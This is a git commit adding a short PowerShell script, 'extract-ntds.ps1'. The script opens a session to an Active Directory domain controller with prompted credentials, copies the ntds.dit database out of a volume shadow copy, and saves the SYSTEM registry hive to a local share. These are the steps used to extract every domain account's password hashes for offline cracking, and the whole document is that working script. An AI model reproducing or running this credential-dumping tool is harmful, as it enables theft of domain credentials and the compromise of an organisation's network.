907be81a2a5550496d8170cdf97463ff9281c3de
WilliamTIII <41160954+WilliamTIII@users.noreply.github.com>
2020-01-15 08:22:14 -0700

    initial upload
    Connects to a domain controller using credentials it prompts for. Copies ntds.dit to a local directory, then does the same for the SYS reg hive.

---
+++ extract-ntds.ps1
@@ -0,0 +1,4 @@
+﻿$dc=(Get-ADDomainController).hostname;$pc=$env:computername;
+New-PSSession -ComputerName $DC -Credential (get-credential) | Enter-PSSession
+& cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\$pc\c$\steve\ntds\ntds.dit"
+reg save HKLM\SYSTEM \\$pc\c$\steve\ntds\SYS
